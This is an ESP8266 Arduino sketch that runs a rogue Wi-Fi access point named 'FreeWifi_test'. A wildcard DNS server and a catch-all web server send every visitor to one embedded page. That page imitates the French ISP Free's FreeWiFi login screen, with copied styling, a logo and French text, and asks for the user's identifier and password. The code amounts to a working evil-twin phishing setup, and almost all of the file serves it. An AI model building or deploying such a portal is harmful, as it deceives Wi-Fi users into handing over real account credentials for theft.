/*
   Captive Portal by: M. Ray Burnette 20150831
   See Notes tab for original code references and compile requirements
   Sketch uses 300,640 bytes (69%) of program storage space. Maximum is 434,160 bytes.
   Global variables use 50,732 bytes (61%) of dynamic memory, leaving 31,336 bytes for local variables. Maximum is 81,920 bytes.
*/

#include <ESP8266WiFi.h>
#include "./DNSServer.h"                  // Patched lib
#include <ESP8266WebServer.h>

const byte        DNS_PORT = 53;          // Capture DNS requests on port 53
IPAddress         apIP(10, 10, 10, 1);    // Private network for server
DNSServer         dnsServer;              // Create the DNS object
ESP8266WebServer  webServer(80);          // HTTP server

String responseHTML = ""
                      "<html>"
"<head>"
"<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />"
"<meta name='viewport' content='width=400, user-scalable = no' />"
"<title>FreeWifi</title>"
""
"<style type='text/css'>"
"@charset 'utf-8';"
""
"* { margin:0px; padding:0px; }"
""
"a { color: #646464; }"
""
"a:link, a:visited { color: #646464; }"
""
"a:hover { color: #dd0000; }"
""
".bold { font-weight: bold; }"
""
".redbold { font-weight: bold; color: #dd0000; font-size: 14px; }"
""
".italic { font-style: italic; }"
""
".underline { text-decoration: underline }"
""
".red { color: #dd0000; }"
""
".align-left { text-align: left; }"
""
".align-center { text-align: center; }"
""
".align-right { text-align: right; }"
""
".clearer { clear: both; }"
""
"/* Styles */"
"body { font-family:Arial, Geneva, sans-serif; font-size:12px; color:#666; }"
""
"h1 { font-size:21px; color:#666; padding: 10px 0px 0px 0px }"
""
"h2 { font-size:14px; color:#666; padding: 20px 0px 10px 0px }"
""
"p { margin: 15px 10px; }"
""
"/* Layout */"
"#header { background:url('data:image/gif;base64,R0lGODlhCwBtANUAAP7+/v39/f////z8/Pv7+/Tz8/Lx8fb19fr6+vX09PPy8ufl5fj39/j4+Pn5+fn4+Pf29ubk5Onn5/"
"v6+vr5+ejm5vb29vf39/z7+/Dv7+/t7evq6u3r6/38/PPz8+/u7v79/"
"ezq6uro6PHw8O7t7fX19e3s7PT09Ozr6+vp6erp6QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAALAG0AAAb/"
"QIFwSCwaj8ikcgloOp/QqHRKrVqv2Cloy+2CAuCweEwum8/odLrDbrs7g7h8Tq/b7/g8Zs/v+/8YBIKDhIWGh4iJihOMjY6PkBMIk5SVlpeYmZkUnJ2en6AUDqOkpaanqKYPq6ytrq"
"+wrg2ztLW2t7i2DLu8vb6/wL4Xw8TFxscXEMrLzM3Oz80W0tPU1dYWB9na29zd3t/fJeLj5CUJ5+jp6uvs7e0n8PHyJwX19vf4+fr7+x7+/"
"wA9KBhIsKDBgwgTJjTAsKHDhxAjSpQ4oqLFiyMyaNzIsaPHDB9Cihz5QYPJkyg1kFjJsiUJEzBjyjTBoabNmxxQ6NzJE0WIPZ9Ag4bYQLSo0Q0pkipdmkKF06dQVYiYSrWqCAlYs2rdylVCha9gw4odW2"
"GB2bNo06pdmzaC27dw48qNEAQAOw==') repeat-x bottom left; border-bottom: 1px solid #999; vertical-align:bottom }"
""
"#header_c { width:400px; margin:auto; height:112px; background:url(../im/bg1.gif) repeat-x; text-align: center; }"
""
"#bod { background:url('data:image/gif;base64,R0lGODlhCwA3AtUAAP7+/v39/fz8/P////v7+/r6+vn5+fj4+Pf39/b29vX19fT09PPz8/Ly8vHy8v38/PLz8/Hx8fr5+fP09P79/"
"fv6+vT19fz7+/n4+PX19vv7+qWlpfLy8/b39/Hx8vn5+PPz9N/f3/T09fz8+"
"+vr67a2ts7Ozvr6+fX29gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAALADcCAAb/"
"wI1wSNyUjshkycRsOk2hqHQaIlmvWFJky+16v2CvZ0wuexzotHrNbrvdjbh8Tq/b7/i8fs/v+/+ADRyDhIUcEIiJiouMjYsMkJGSk5SVlpeYmZqbnJ2en5ogoqOkIBOnqKmqqxMLrq"
"+wsbKztLW2t7i5uru8vb68IsHCwyIWxsfIycoWCs3Oz9DR0tPU1dbX2Nna29zd3t4Z4eLjGSjm5+goCevs7e7v8PHy8/T19vf4+fr7/"
"P3+9B0CChzYAYHBgwgTKlzIsKHDhxAjSpxIsaLFixgzatzIkeGBjyBDihxJsqTJkyhTqlzJsqXLlzBjypxJs6bNmzhfYtjJsyeG/"
"w9Agwr9YKCo0aNIkypdyrSp06dQo0qdSrWq1atYs2rdyrWr169PJYgdS7asWQkn0qpde6KA27dw48qdS7eu3bt48+rdy7ev37+AAwseTLiw4cOIEx"
"+uwLix48eQK2iYTLmyBgKYM2vezLmz58+gQ4seTbq06dOoU6tezbq169ewY8ueTbs26Au4c+vezfvCiN/Ag48QQLy48ePIkytfzry58+fQo0ufTr269evYs2vfzr279+/gw4sfj/2B+fPo06tfnz6A+/"
"fw48ufT7++/fv48+vfz7+///"
"8ABijggAQWaOCBCCao4IIMNujggxBGGAAFFFZo4YUYUgDAhhx26FrhhyCGKOKIJJZo4okopqjiiiy26OKLMMYo44w01mjjjTjmqOOOPPbo449ABimkkAMUaeSRSCap5JJMNunkk1BGKeWUVFZp5ZVYZqn"
"lllx26eWXYIYp5phOBgEAOw==') repeat-x; height: 800px; }"
""
"#bod_c { width:400px; margin:auto; text-align: center; }"
""
"#block { width:400px; margin:auto; }"
""
"#block_2 { background: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAFcBAMAAAAHSeLtAAAALVBMVEX4+Pj5+fn29vb39/f19fXw8PD+/v76+vr09PT7+/vz8/"
"Py8vL8/Pzx8fH9/"
"f2XRcGgAAAASUlEQVR42s3EQQEAEBREQRVUUEEFFVRQQQUVVFBBBRVUkMEr8Zc5jCtwsg4+beFtHeIqdHlYpxBhXYB1CZIadA2Im3jbxqdlKLpDmb4rskMpGQAAAABJRU5ErkJggg==') repeat-x "
"bottom left; border:1px solid #e6e6e6; padding: 20px 20px }"
""
".label { display:block; width:100px; float:left; text-align:right; padding-right:15px; font-weight:bold; padding: 10px; }"
""
".label_r { display:block; width:250px; float:left; text-align:left; padding-left:15px; font-weight:bold; }"
""
".input_r { display:block; width:200px; float:left; font-size: 16px; padding: 5px; font-weight: bold; }"
""
".input_b { display:block; width:100px; float:left; padding:5px; margin-left: 175px }"
""
".button { display:block; width:200px; padding:5px; margin:auto; }"
""
".msg { clear:both; color: #C00; font-weight:bold }"
""
"#content .lists ul li.img-modif-info { background-image: url(http://www.free.fr/im/components/mon-compte/list_modif_info.png); }"
"</style>"
""
"<!--<link rel='stylesheet' type='text/css' href='https://wifi.free.fr/css/small.css' media='screen' />-->"
"</head>"
"<body>"
"<div id='header'>"
"  <div id='header_c'>"
"    <div id='top'>"
"      <div id='top-menu'><img src='data:image/png;base64,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"
"VsEjaouMU3XydIksm5Ey6OX4A3yhLUX/n0RZq"
"+59HzLIkzmnk9Hq9lm4FDjxgdXSF5QcFkhiqY6yhmbrqGijGgRFGl4dWIciMoADX5AnknXIqec6c1G1IqmGjjUEt3vPee2saFn3dnNjxAlvuvBf1VqNepQ0YLMlavZDwao0mDkZw88cvh"
"+v1nTASY001bU8WV9OQ6t7akqCIRw0GAgs72ZFvFTjgufxi5ZPkFfl6baRAWB/GjUGermYlpfEa8jiKqPjWG6kHci4NcHv1RqTkV8naKi+/0qV3WWDMzNLNOaRUGZqcI8so56QTyXniKDVVTrk"
"+QMgeEn/EFuonqhuz49n0z4ePmwNE1Oo9aSzljByufK8ebOP+V0xwx48/ZE0q/pex1msNxnrseGxLgrKqeE+IidPx9O/N3zl37MIlC5RhqC9GCqikgbp6tXaReUWsRrNaV/zDb1Gu19tkDNnT7sEMG/6g"
"+NvXPKedStnCmOXjQABnSTE5hg+hHN56+KdIuJ+zf2IcTrk33Yk9u99fWj//GsssaL/"
"v3OlcbxEr8kWqXvfgUnKy1dodt1wzC5uUu0Q3oV0rUBtqYJsYG2gXZUu2IyikZwDGIY4m0vsq9X0hd8E88p4yntgolOT70+fpab+ex4wBthK3/uKRhAHIeA/cKyU/"
"vU3F9fK4MymeVp9XGYg4uDzyzg796aT9/EWXkWP29GVsoOm1xNcKRECHtnZSaOd7K620DBjRMAxAgAXik2HlxhrAimxxMmoE1MrGVps9g61+P/Lx4Sp+P"
"+P9svpEAi7bERTr2MKqivhWs4SxGayX8Hf2VnoiDpettlUIu+tc96JZNSpYovgn/0reoiKMcyvTdUoYkbC+kZnVNlE4S6++Jvg3ETO878IFVHPuvFjpvXeotX6tykVwO/"
"mL1WXM8MEPqqqeoPp7NUJii48O/9QC3x1/e5fg7ul89U3yzpxa27B3P5WOHS0ClcGzFUE14gS2busOPtf3nvg+QuJ8o0epmSomlzM6BRUaH4EWrGNkYSwp+P7XyQfjDC"
"+Zksm4y8FRSpBYZm4R1SjdlLGMGhnPhIggnmFTFVzzPNVf/i+J9kbrGlV4n4ODISwTR2UR1vplosJPi5+TiceDyvWaZMS9ah+k5B"
"+MZpigEKlvpA528xjdPSxFKcKuJEndCNiKoGoKFo89Yek06+iwMOYt/RpUtabezoGMfwQWKoOO3mCj63Eq/G7xAqi2NZmsygBrsG/82CoXG3isjDVYcZCDClZyfCv1pObCFxrcsYuCL79Ohy"
"+6KsnAowVJFF05j2IcmojAdmgVZtIbFuLmH9xFBT+6mYKsriOxVCxnCYqfOmZygqCYZUOYABD567sU4BUSI2+/k6T6Q90v4NDAwZd/cUVvNRdVYZb9sY0agbEnBybUtrKTv+HKG0wJmv/"
"dpTTom9eSNzc3aV7msbzzOgRAtHcsPHjZNaZkwkfA/9uHKP/EMeTzeiszXbWAJ0/Hmtb9gY7yOknpkgobnMLuC7acOnhciMWyuzgYI8pj2K6PDlGEI5Ci"
"+w6kEA6BBnlfuYwKEFTPQQKIlgLZELnUdO9Ky6gf1RYee7pPP5XcrBG4eDwKQxWSVm+Ep/FhplDXgY9T3D5obz5bsUvYap7j9apgkHTqvirYRn9sI0HV2JM7G6ZimUpPdkcU/"
"fOXsZQJ9VZ6ot9AnWvlqV5Wki7/pmspj1Voj9u9IlNyolyW6suKrrhkZbh2b1qyIFLJGK2E+80SJCOP+ch78Vwq4KAMWF05emkt/9QSokzQCpbeSwfdckN5lF04nTxtzjSxGg"
"+Dm5XRzXgPPlKYfuabX0mFc1UYZRNiblGvkDMZLVtIUCU9OztrW/fstYxo0aSnj6VnaR+W+Dj8/"
"gexfRWLktRGDXKoj4N5UnZBSbFlMIKW12wLyzAvWVLVysaUdJO4ze7VzsEvipk1mBOaN3s6eUeNUCGFMO6AIMaPBrDj8fSaUDhc3vrMn6idfbqZfgC0OjF2dnIwgueMSWpOaB7mpGqhjELMBExmO7aQoB"
"h7wmgTeGJdiooFUNBpIT0x9uwLOTWA4aDXO+7Vee6khbdcT3lFhTBA9WoZD4zN+B837XFVnLcSkqeDQ/dC7HoJb"
"+dlTNjK29XSpmbmoD4YlZxFBTzzxU9agAImaXvGjSFPYQGsrSrwX0kuJqeV5Iqfn4qPQ86V86oK51VQ2zu8dAokJv8Xt9iR+ozq9cFthQCGeL34GGBsbVWvhqXdt7aQoBi/Kel5+XUpYy90ALUqAc/"
"HzO3D2FPrSDASdba317Zh7R/8C0IkJgumjBVMmpgSY9ud4dj+og5l8OIPD6uhfv4pQwy2zjDPeOG3ClWdCaAidWCwwY+PVfA9iIHfsQai6+vl"
"+pWLBMYfZb21qNfFbVCBCvE6e1PvsaGTXbmznqAIWOeAgZVWhg5N7cwrLmoqKytT09H6+oq1joz1gbSyIKn6MrbVyjFuURfGijiP8S9+Wh4mpZoWp22PlZBaOWZbrV6tPm2LupBfqxPb/"
"qzXrC3ZfC6rCaqNPdsOHlJjT21Kl/6FFv/n7VSEuNt+kJ76cmVfEOgPBFSIZH8UNBDLUGNPttwGLCZkw8TvvYStl33wew7E55Y2ZQ8CWU1Q5VrpCFDAItwO/"
"jcPrzWEKU7Z80rlSbIJgawlKMae0XDYj0WpzIK9NenpycnpF8ttNnUKeZaBg0DWEhTxsOwzpPbH1piijbAySE9e+EukpylCcnIgIJCVBI1bGP2df3zNNKIHq+1hVTyO5qn5NCyrA"
"+HFShuyA4GsDFSA2wGLRyPqJSVxwACihli1RQRNr+dOclC6Wkpo6JAh/TZ/EVbnI3V1tWgzB7xntYU95b3ICVMEsrITYPxZ9+tnVpoFlmPlgbJH7oV6u3ZIL/4xz759+2Jr165Vq/"
"RpiJ5xxhl06aWX9gnLF154IbZt2zatSDUBeta559LZM3kleJPUGzLjnu07dtTu3LmTmvi/uPV3OuXkk2ny5Ml02qRJ/dbm/m7j8VaeKZDH20MY24slQnbevqKaeI6jz5dLjUNKqHXsSJXNdfEcmnX5/"
"Bp2rSw61jAzdPBHVq2qxRKaxlRx4YWWZDLmNR5DGoP0xuT3++mmm25Kekdow8a33qo1knnatGk0Z86cpLzG8owfAeP1/jq+4frrqWz48ERb+tLm/mrT8VpOVqq4CPhmSUdrxw5NfS8tzTSxvr6cv/"
"Iq4iU1g/UZSB8zcuKOmnfesb6xhyvr16csX6vugDQyJiM5cR1teuONN+jtTZtiVhIX+Xhsjs2nmtS/ZvR6x+sr6Uub9eXYcT8rCYoXOWbMGAckxq5dnywUjYB5pK01x76CFgxPq1atUveb/YHK"
"+Prrr8d6kmLGe3EPyGVM6OhTpkxJ6ujGPP11jLp4adE"
"+F8eYqzYfq2bS54qzuICsJSje2fTp09cyQRdqxMQ5BJQfOHCgR2mDvPr0FquVVtJTy7dlyxZIqXGZxp6mIz3Gn2blnHPOOSCtqYqbTnpqbTTbgpxLlixJqKRmefpy7tNoc1/"
"aczzdm9UExYLTGzZsiG3cuFG9Ew7oTrybN/kcxqrG+Y+JDLqdQx9/HHs4jfTUsoLA27dvhxU2o85uRXqMPa3IFietA22vq6+vRt0D3eJ7PLZZe6ef9zYr/aB6UOfOnesoKSlR07H05xWZduxQHVx/3mz/"
"ZYsxolneN998k0Bos2v6c3tqa5OstvprFRUV+kPTfXxYQMyBTk5944/HNuvb/3nsZz1BAapVh8+ETLCw7t+/P+XdjB49mmC5NUtbMzAYQYKbJbhsMiEdCA7tAD/"
"sm5U10M4dj23+vDG0BUHR4eGjM0s9ScfNmzeb3UYzZsxQaijUUWOCCyQdabZu2WJKehhrpp51lrG4lOPHH3889tTTTxM+MPhhH+dSMg6gE8djmwcCfFk9BtUDPGv2bNrPxiGjoQfS8e/vvhszc67DbbH"
"+lVf0xah9SE9NypUzoczyWElIFLD5L39JKRMnpk6dSmUjRqQdv6Ktv/t96r+sSPccppXpTuLe5cuX90hwfEAmTpxIZ/Ezj"
"+ihnbriFb793WZ9+dm8bwsJiheIDgUCmKXXNmwwO23p24SFVUsw5oCwxqQRxngeKqlZFA8kMcbLxvwD6RgfN2gHVn7bgdTWbGmLbQiKF8Z+xUozlRSEAXH0L9WKSBgjjhs/PolIU8vL9bcm9o3Exz/"
"43bp1a+K6fmfG9On6wwG9z+v5Duj2ZVPjbKPi4qXhXyyw2mqqkoI4IBDyYLt69WrT91x+5pkp56EeY4wFqalPIL4+umfTpk3VRhUb+SGBp06blkR6fTmf9n6mgQogJtpq5QL6tNtpx/"
"JtRVC8YHQuMzKBOCAQZ3HsYPeLGZEgPYePHGlKJKi9TxkIivoQAgjCHz50qNpsHIY8lRbWYFz7LNKnHajwWTxDttZhKxVXe4n6MaR2DluMr2BhhWXUmCBlZs6cWWk8rx1D7QWBjQlSFIS3Ci9MR3pjWXJ"
"sPwRsSVArMuH1/+mll0x7AQxMPf0XsjNN1F8UBsIb1V+c74n0yCPJ3gjYkqB45TPPPnsZCJJJQr4pkycv6ynvSFZ/Z82a1VO2xPVMSJ/ILDu2RMC2BMW/eLByuxh7AlTiTP8lBIicCfGPB7eKEQc5/"
"uwRsC1BATX8jmZuF/1rwPVjsVpmSvzz587VVyP7goApArYmKBDpiSi98U9CiqYjPsIOzSKXTN+QnLQ1ArYnKIhiFafbW/8kpChCAM0S1F8rK7JZfuO5dOpzumsoxyrAwOq8se7eHqdrV7prva0vm"
"+6zPUHxMi+44IIVRomH474QCWqx0e2CzogyR4waZepLzaRjwQINQ5S+Y6ty+ZwxwslYHsbcxrBE9RGyCIE03t/b4760ubd1Zst9ve4o2QKA/jk+OnAgdrSlRXX+njq7/r50+/i/"
"mkeOHKlCnv5WaxE435tytecsLiqikSec8Jn2gd62OR3Gck0QEAQEAUFAEBAEBAFBQBAQBAQBQUAQEAQEAUFAEBAEBAFBQBAQBAQBQUAQEAQEAUFAEBAEBAFBQBAQBAQBQUAQEAQEAUFAEBAEBAFBQBAQB"
"AQBQUAQEAQEAUFAEBAEBAFBQBAQBAQBQUAQEAQEAUFAEBAEBAFBQBAQBAQBQUAQEAQEAUFAEBAEBAFBQBAQBAQBQUAQEAT6B4H/B6HymGXuok3qAAAAAElFTkSuQmCC' width='232' height='112'" 
"alt='aperçu d'une image encodée en base64' />"
"      </div>"
"    </div>"
"  </div>"
"  <div class='clearer'></div>"
"</div>"
"<div id='bod'>"
"  <div id='bod_c'>"
"    <div id='block'>"
"      <h1>CONNEXION AU SERVICE <span class='red'>FreeWiFi</span></h1>"
"      <br />"
"      <div id='block_2'>"
"        <p >Pour vous connecter au service FreeWiFi, <br />"
"          utilisez les identifiants que vous avez configurés lors de votre premier accès au service<br />"
"        <form id='form1' name='form1' method='post' action='/Auth'>"
"          <label for='login' class='label' > IDENTIFIANT</label>"
"          <input name='login' id='login'  class='input_r' value=''/>"
"          <br />"
"          <br />"
"          <br />"
"          <label for='password' class='label' > MOT DE PASSE</label>"
"          <input type='password' name='password' id='password' class='input_r' value=''/>"
"          <br />"
"          <br />"
"          <br />"
"          <input name='submit' type='submit' value='Valider' class='input_b' />"
"        </form>"
""
""
"         <div class='clearer'></div> "
"      </div>"
""
"  </div>"
"</div>"
"</body>"
"</html>";


void setup() {
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("FreeWifi_test");

  // if DNSServer is started with "*" for domain name, it will reply with
  // provided IP to all DNS request
  dnsServer.start(DNS_PORT, "*", apIP);

  // replay to all requests with same HTML
  webServer.onNotFound([]() {
    webServer.send(200, "text/html", responseHTML);
  });
  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}



